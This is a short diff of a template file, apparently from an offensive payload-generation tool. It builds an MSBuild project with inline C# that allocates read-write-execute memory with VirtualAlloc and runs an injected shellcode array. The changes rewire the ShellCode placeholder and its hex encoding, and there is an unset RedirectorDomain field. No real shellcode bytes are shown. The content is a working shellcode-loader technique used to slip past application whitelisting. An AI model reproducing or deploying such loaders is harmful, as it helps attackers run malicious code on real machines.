@@ -1,5 +1,6 @@
 [ShellCode]
 value: notSet
+process: hexEncode
 
 [RedirectorDomain]
 value: notSet
@@ -76,7 +77,7 @@ data: <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/
 											public static void Exec()
 											{
 					
-												byte[] shellcode = new byte[193] { ${Processing:value} };
+												byte[] shellcode = new byte[193] { ${ShellCode:value} };
 		 
 														UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
 																			MEM_COMMIT, PAGE_EXECUTE_READWRITE);
@@ -166,7 +167,3 @@ data: <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/
 	    </Task>
 	  </UsingTask>
 	</Project>
-
-[Processing]
-value: ${ShellCode:value}
-process: hexArrayEncode
